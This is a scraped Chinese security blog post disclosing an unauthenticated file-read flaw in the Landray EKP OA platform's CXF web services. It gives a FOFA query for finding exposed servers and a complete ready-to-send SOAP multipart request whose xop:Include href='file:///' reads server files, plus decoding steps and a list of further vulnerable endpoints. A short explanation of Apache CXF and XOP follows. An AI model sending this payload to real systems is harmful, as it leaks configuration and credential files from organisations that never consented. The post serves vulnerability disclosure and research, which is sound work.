---
title: "蓝凌EKP sys/webservice/elecPsealUseWebService 文件读取漏洞"
source: https://mrxn.net/jswz/landray-ekp-sys-webservice-sqli.html
asset_dir: assets/蓝凌ekp-syswebserviceelecpsealusewebservice-文件读取漏洞
---

# 蓝凌EKP sys/webservice/elecPsealUseWebService 文件读取漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/1/15 19:45
* 2755浏览
* [2评论](#comment)
* 26分钟阅读

深入探索

安全

Apache CXF

webservice


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

[蓝凌](https://mrxn.net/tag/%E8%93%9D%E5%87%8C "蓝凌")核心产品EKP平台定位为数字化生态OA平台，数字化向纵深发展，正加速构建产业互联网，对企业协作能力提出更高要求，蓝凌新一代生态型OA平台能够支撑办公数字化、管理智能化、应用平台化、组织生态化，赋能大中型组织的内外协作与管理，支撑商业模式创新与转型发展。由于蓝凌OA sys/[webservice](#)/ 接口下多个接口如 kmsMultidocMaintainCategoryWSService、elecPsealUseWebService、elecSealInfoWebService等等众多接口未对用户输入的数据进行严格的校验和过滤导致[文件读取漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "文件读取漏洞")。未经身份验证的攻击者可读取系统内部配置文件造成信息泄露。

网络服务

# FOFA语法

`app="Landray-OA系统"`

# 漏洞复现

深入探索

计算机安全

软件

SQL注入防护

访问 `http://landray.mrxn.net/sys/webservice/?wsdl` 获取完整 CXF - Service list 之后再对每一个 service WSDL链接配合burp Wsdler插件测试，或者在较新版本burp中直接扫描，它会自动爬取wsdl连接并测试，也可以写个nuclei模板批量扫描测试。

[[![蓝凌EKP sys/webservice/elecPsealUseWebService 文件读取漏洞](images/img-001-f190f29aefa6.png)](https://mrxn.net/content/uploadfile/202501/06a81736944447.png)](https://mrxn.net/content/uploadfile/202501/06a81736944447.png)

```
POST /sys/webservice/elecPsealUseWebService HTTP/1.1
Host: landray.mrxn.net
Content-Type: multipart/related; boundary=----123456; type="application/xop+xml"

------123456
Content-Type: application/xop+xml; charset=UTF-8
Content-Transfer-Encoding: 8bit

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ser="http://service.pseal.elec.kmss.landray.com/">
   <soapenv:Header/>
   <soapenv:Body>
      <ser:applyUseSeal>
         <arg0>
            <abc><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///"/></abc>
         </arg0>
      </ser:applyUseSeal>
   </soapenv:Body>
</soapenv:Envelope>
------123456--
```

深入探索

Web 服务

Web服务

CXF

[[![蓝凌EKP sys/webservice/elecPsealUseWebService 文件读取漏洞](images/img-002-65b841a42564.png)](https://mrxn.net/content/uploadfile/202501/6be41736944362.png)](https://mrxn.net/content/uploadfile/202501/6be41736944362.png)

对响应中的 `Unmarshalling Error:` 后的内容进行 base64 解码 即可得到文件列表或者文件内容。

漏洞扫描服务

## 部分接口

```
eopBasedataSupplierWebserviceService
kmsMaintainLogWSService
kmsAskWebservice
kmsMultidocSearchCategoryWSService
thirdImSyncForKKWebService
kmsWikiSearchCategoryWSService
kmsMultidocMaintainDocWSService
kmForumWebserviceService
kmsWikiMaintainCategoryWSService
kmsWikiMaintainDocWSService
sysNewsWebService
fsscLedgerContractWebserviceService
sysSynchroSetOrgWebService
kmRelativeWebService
lbpmFlowLogGetWebService
sysHandoverWebService
fsscCtripBusinessOrderWebService
kmCalendarWebserviceService
sysZoneWebService
yworkWebserviceService
sysAttendWebService
wsTestProjectServiceImp
fsscLedgerWebserviceService
modelingAppModelWSService
sysFormMainDataInsystemWebservice
```

稍微跑了下，太多了！！！这只是一部分。。。

开发工具

# 漏洞分析

不算分析，主要是由[蓝凌](https://mrxn.net/tag/%E8%93%9D%E5%87%8C "蓝凌")使用了Apache CXF 框架且启用了SOAP服务的 XOP 功能同时服务器未对  的 href 属性进行校验，允许访问任意协议或路径。

## 什么是Apache CXF

Apache CXF 是一个开源的 Web 服务框架，全称为 Celtix XFire，由两个开源项目 Celtix 和 XFire 合并而来。它提供了创建和消费 Web 服务的工具，支持多种协议和标准，如 SOAP、RESTful 服务、JAX-RS、JAX-WS 等。

## CXF 与 XOP 的结合

### CXF 的功能

* Apache CXF 支持 SOAP 和 WS-\* 协议，其中 SOAP 的实现可能涉及 XML 的扩展优化技术，如 XOP（XML-binary Optimized Packaging）。
* 在 XOP 中，二进制数据（如文件、图片）不直接嵌入到 XML 消息中，而是通过 `<xop:Include>` 元素的 `href` 属性引用外部资源。

### XOP 的工作原理

* XOP 消息由主 XML 文档和附件（通常是二进制文件）组成，通过 multipart/related 格式打包。
* `<xop:Include>` 的 `href` 属性可以使用 cid: 协议引用多部分中的其他部分，或者指向一个外部资源（如 file://、http://）。

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#蓝凌](https://mrxn.net/tag/%E8%93%9D%E5%87%8C)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.FOFA语法](#toc-2-)
* [3.漏洞复现](#toc-3-)
* [3.1.部分接口](#toc-3-1-)
* [4.漏洞分析](#toc-4-)
* [4.1.什么是Apache CXF](#toc-4-1-)
* [4.2.CXF 与 XOP 的结合](#toc-4-2-)
* [4.2.1.CXF 的功能](#toc-4-2-1-)
* [4.2.2.XOP 的工作原理](#toc-4-2-2-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[蓝凌EKP sys/webservice/elecPsealUseWebService 文件读取漏洞](https://mrxn.net/jswz/landray-ekp-sys-webservice-sqli.html)  
文章链接：<https://mrxn.net/jswz/landray-ekp-sys-webservice-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALcElEQVR4Aeyai3rjuA6D+8/7v/OewBhIlCw7aXpJzq77lQuSAClVtJJMu38+Pj7+edb++fu1qv9Lfap3aoKrvnMuWuEZN/OKZWc14aRbWXhhePlfMQ3kVn99v8sJtIHcJvzxqD2yeeAD2ElXa8wiYKv9jBaY23xbDGz7SUNwXPcXLli5e35qhG0gCi57/QnsBgKePuzxaLtnT0BqooHeN1wQzM0xkNTuFjfi5mSNIDA82TfJ3W9wDXC61t1GfwXQ+8Ho/5UMsBvIwF7Br5/AtwwEPPm6e3AuT2u4xEIYNcodGVgLxvT7DNbe4D41J3/VD6ydOXAemKmn428ZyNOrX4W7E/jWgQDbazawWygJoGn0RMrCnaF0smjAfRILwTkwSi8Dx9BRehn0HIzvG2BOPWTgWHU/Zd86kJ/a5H+p788M5L90gt/8s+4Goqt5ZM+sDb7mYDzrAdbAMab+aI/KRzOjuFi4OYa+djTgXLQrjHbGlTa5Wat4NxAlL3vdCbSBgJ8CuI9H283khdHIl82xcuC1wgXFyRILFcvkVwP3AGr6aV9rxNIkMbB9IEkeHANJNQQ2LdzHVnRz2kBu/vX9BifwJ9N/BrP/1EJ/GpKLZoVHGnCfWgP7nPj0ECpemTgZuAfQZMD2JIuXgWOgaeKIlyVeofiv2HVDVqf6wtzhQIDtyVntDdZcfTLmunBzXjG436xJXFF6GbgG9iheBubkH1l6r/hwMPYBx+GFcz1YA3uMFvbc4UBSdOHvnsAf8JSyLDjW1GXJV1ReBtZWbvbBGtjjkVa9ZXBcI15WeyiuFg7cJ7EwOhi55IXSrUycbMXNOelmg3HNWvP/dEPqvv+1/jWQNxtt+9g77wuOrxWYy1UEx9Ax/aJZ4axJDO5Ta8Ill7giuC65WZtYCNbKl6VmheJl4JqVZs5JLwPXALOk/UWyEtcNqafxBv7uTX3eE7B9/AUapcnLkpAvSywEtjr5RwbWgPFIp7z6y+C+Fu5r1POzpvVlsO8PzsGIdQ0wpx6ycPJj1w3JqbwJtvcQuD+97BmsTfwIwnFNno70mePk7+FcB8drpheMGnAMe0zNCue1H9HAfo3rhqxO7oW53UDAUzub+MyBa+rPEQ3suaqTD9bMNeA8INlgwPYelRrhILgTSF9tJa+8fBjXrDUwctLPBtaAsdbH3w0kxIWvOYFrIK8598NVdx97c80OK24EHF+5G738PusbDo77grlog+A80NYNl0RiYHuZg47RBKMVQtdB/1+Eol0huCYcOAaS2qHWil03ZHc8r020j72Z0CPbmbWJK6ZPcokfwdSsENie8rM+YE3qYYyTF6YPWAMdw80IXQP21UsWLTifWCi+mnKzXTdkPpEXx+09BDxRMGZf4Bj2GM2zmKcl9YnBayVfMZqaiw9jHaxjcB5IaftFX/oLQ8qXJQ4qF1vlwgWB4XbPeeDjuiEf7/W1ew+Zp7babjThwJOHjuFmhK6B0X9EGw24NnsRhnsEpZeB+8Ae0wfMJT5DuK8Fa8CofcSuG3J2ui/gDt9DMrGK2R94smBM/qsIY7+ztVdrRR8u8QrBa4VLTcVwwcod+WfacMH0AO8FuN5DPn7m6+mu10vW00f3M4W7N/UsA/0agf1ctSNMrRBcI7/aqrbyj/rpU/WwXhP2+dSDucSrfmBN5WYfrIERZ12NV2teN6Se0Bv4nxoIjNOHMc7EhfPPBtbWPDgn/cqqdvbBtdBx1iRO78QVw4H7rLjkYNSAYyCSHQLbPwahY0TgXGLhpwaigst+9gQOB5Inpy6f3IzRgCcO/VfV4Fw0K4T7mrlu3kONowX3hfuY+tQKwXXhZpQmNnOJwz+KhwN5tMGl+94TaP8w/Exb8JMz1+SpEMJaU2ukqxYOXAsdo4smCF2TXHCuSVwxWnCfxCuEr2mybnrPsfLXDdEpvJFdA3mjYWgrpwORYGWrq7bSKfeIFvxSAMZVDZhTz2rRCmu++uJk4B5ApTdfvGwLvvAf9ZCtWgDbR+Bw4Fj62FMDScMLv/8E2kDA08oSMMbKg3MwojgZ9LxiGTgnfzYYuTwlMOZVF06+DKyBPYqXwcilhxDMyZdJP5vysuTlyxJXBPeDEatGtbLk5MsSC9tAFFz2+hNov1w82oomGIsm8SOYmiD0Jyj14T6Dqa0414eb84rDQd8P9H/Qigdz0q9Mmlj4OU7+DMHrANffQz7e7Ku9ZGWyM0KfXjjoOej+6mdLzQrBtXNdtDUPay04D+PTrR5gTr6s9ouvvCwxuAZIqiGw/JQENE0c9ZQlrghsfcAoXawNpBZc/utOoP3qBDwtGHG1tUwzuNLMORj7wvETDdamf8X0hb0GnItmRjAPNArYntas0YgnHXC/lKevcJWrefHXDdEpvJG9YCBv9NO/4VZ2A9EVqrbaM6yv5Ur7SA7Gfmc1dW/yq1axLDn5sjlWDsY1YYxTI4Q1pz6zSS8D10BH5atB58D+biC14PJ//wS+9A9D8FTBeLb9PElVA2NdNEEwD7QyYHsTbonigDkYsUjuullbGLH8aslDXye5YNXHDweuS77idUNySm+CdwcCnibsMT9DJgxdEw56Dkh6icD29IOxisC5rBUOnIf+MTrcjNC1M5e+cKxJDViTGiE4F00QnIeOZ9zdgaT4wt85gTYQTVk2L6vcPUtN1a1y4pMXKpbJl8mvptxs0J806LdCddHKr5Z8xcrLr9zsg9dMXnoZOA+EeghVK4tYfqwNJOSFrz2BayCvPf/d6ruBANsb6055S4A5eBxvZcN3rqYQ3GcQPBmclcF+HRhzMMbqpz1WU04Ge63ysujlyxILFa8M3A+4/h7y8WZf7YaApzTvD5yH8Q1UE4+lJnHFcJ9B8Jq1T/z0SQzWAqG2Gw40jLYJFk40FaH3AFpV1cRv5InziLYN5KTPRf3iCbSBZHrBsz0A29MXzaoGrIERUyOc68BacTJwDB2Vr5YewpqXr5xM/mzKy6D3htFPjXQyMJ88OIb+6gHOrTRzTj1lyQvbQBRc9voTaAMBTxZGXG1RU5WFA9ckXqH0MrAW2MnEy0LIj805YLil4SuCNWBML2HVyVdOJj+mWJY4CO6XWAjOSS9TbjYYNTDGqmsDmYuv+DUn0P6mrulUO9sOeLKzBpyH/pqantEmFiY3ozgZ7PuBc6kBx9AxnHrIElcE68XLKhcfrAFj8tLLElcEa8FYuUf864Y8ckq/qLkGcnrYv08e/sVQV3K2bC/5xMHkheArC8ZowDF0POKSX6HWOLLowWtEB46hv6RCzwEpHTD1Q3IKopmxysIllxjYPqAA169OPt7sq72pQ58SPObnZ1lNOrkguGdqhOHky45i5cWvDNwXWNFbDtieQPWJgXOb4M5/wNpHasHas5YwatJXeL2HnJ3cC7g2EE3nUfvMPsFPw6o3mHukH6y1te/cJ9ycVxwuqJwssVDxysTJPstFr1oZ+GeCjm0gEV/42hPYDQT6tGD0n9mqngQZjL2gf9IRLwNrsg44BpJqCGzvC7DHJvrrqLfsb7gBuG4Lbv8RL7u5h98w1lQhmIMRV5rktN5su4FEfOFrTuAayGvO/XDVbxkI+JrW6wfOgTE7qJrkguHmWPnkgsodWTQzgvcCzFR7+dsRt8S8DrDpb9Thd2qqILmam/1vGcjc9IqfP4FvGUgmD35yYP+GfbZFcF006Ze4YjhwDewxejCXuGL61Jx8cA30n0H5Ry19wX1qHTgHxnDgGLh+dfLxZl+7G5IJr/De3msNeOpzDTgPzFSLge01GjqmNziXeIVpFA72NdGAucQrBGvAuNJkrZlLfoXRVm43kIgufM0JtIGApw/38ae3mifmbB043udcl36wr4k2morhjrBqYewdDnp+7gPmar4NpCYv/3UncA3kdWe/XPl/AAAA///OHaU0AAAABklEQVQDAHQjQrBhGjoXAAAAAElFTkSuQmCC)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/landray-ekp-sys-webservice-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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